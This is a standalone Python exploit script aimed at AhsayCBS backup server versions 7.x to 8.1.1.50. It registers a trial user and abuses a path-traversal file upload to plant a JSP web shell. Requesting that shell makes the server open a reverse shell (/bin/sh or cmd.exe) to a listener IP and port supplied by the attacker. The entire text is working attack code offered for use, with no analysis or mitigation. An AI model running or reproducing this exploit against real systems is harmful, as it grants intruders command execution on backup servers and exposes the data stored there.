import requests
import urllib3
import sys
import base64
import requests
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="Authenticated Remote Code Execution in AhsayCBS 7.x to 8.1.1.50")
parser.add_argument("-ip","--ip",required=True,help="Target IP")
parser.add_argument("-p","--port",required=True,help="Target port")
parser.add_argument("-li","--lhost",required=True,help="Listen IP")
parser.add_argument("-lp","--lport",required=True,help="Listen port")
args = parser.parse_args()

rhost = args.ip
rport = args.port
lhost = args.lhost
lport = args.lport

trial = False

checkTrial = f"https://{rhost}:{rport}/obs/obm7/user/isTrialEnabled"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r= requests.post(checkTrial, headers=headers,verify=False)
if "ENABLE" in r.text:
    print("[+] Trial is enabled!")
    trial = True
else:
	print("[-] Trial is disabled!")

usr = b"Jvr6v0YK" #Need to be changed!
passwd = b"testAd9090e!" #Need to be changed!
user = base64.b64encode(usr)
password = base64.b64encode(passwd)

url = f"https://{rhost}:{rport}/obs/obm7/user/getUserProfile"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-custom-encode-username": user.decode(), "X-RSW-custom-encode-password": password.decode(), "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r=requests.post(url, headers=headers,verify=False)
if "USER_NOT_EXIST" in r.text:
	print("[+] User not exists! Running exploit...")

if "SERVER_STOPPED" in r.text:
    print("[*] Trying to log-in...")

url = f"https://{rhost}:{rport}/obs/obm7/user/addTrialUser"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-custom-encode-username": user.decode(), "X-RSW-custom-encode-password": password.decode(), "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
r=requests.post(url, headers=headers,verify=False)
if r.status_code == 200:
	print("[+] Adding user...")
else:
    if trial == True:
        print("[-] Create trial user failed!")

url = f"https://{rhost}:{rport}/obs/obm7/file/upload"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "X-RSW-Request-0": user.decode(), "X-RSW-Request-1": password.decode(), "X-RSW-custom-encode-path": "Li4vLi4vd2ViYXBwcy9jYnMvaGVscC9lbi9tUmNkSmpDQm1wLmpzcA==", "Connection": "close"}
reverseShell = '''<%@page import="java.lang.*"%>
            <%@page import="java.util.*"%>
            <%@page import="java.io.*"%>
            <%@page import="java.net.*"%>

            <%
            class StreamConnector extends Thread
            {{
                InputStream az;
                OutputStream jk;

                StreamConnector( InputStream az, OutputStream jk )
                {{
                this.az = az;
                this.jk = jk;
                }}

                public void run()
                {{
                BufferedReader vo  = null;
                BufferedWriter ijb = null;
                try
                {{
                    vo  = new BufferedReader( new InputStreamReader( this.az ) );
                    ijb = new BufferedWriter( new OutputStreamWriter( this.jk ) );
                    char buffer[] = new char[8192];
                    int length;
                    while( ( length = vo.read( buffer, 0, buffer.length ) ) > 0 )
                    {{
                    ijb.write( buffer, 0, length );
                    ijb.flush();
                    }}
                }} catch( Exception e ){{}}
                try
                {{
                    if( vo != null )
                    vo.close();
                    if( ijb != null )
                    ijb.close();
                }} catch( Exception e ){{}}
                }}
            }}

            try
            {{
                String ShellPath;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {{
            ShellPath = new String("/bin/sh");
            }} else {{
            ShellPath = new String("cmd.exe");
            }}

                Socket socket = new Socket( "{0}", {1} );
                Process process = Runtime.getRuntime().exec( ShellPath );
                ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
                ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
            }} catch( Exception e ) {{}}
            %>'''.format(lhost, lport)
r=requests.put(url, headers=headers, data=reverseShell,verify=False)
if r.status_code == 201:
	print("[+] WebShell created!")

burp0_url = f"https://{rhost}:{rport}/cbs/help/en/mRcdJjCBmp.jsp"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15", "Connection": "close"}
requests.get(burp0_url, headers=burp0_headers,verify=False)
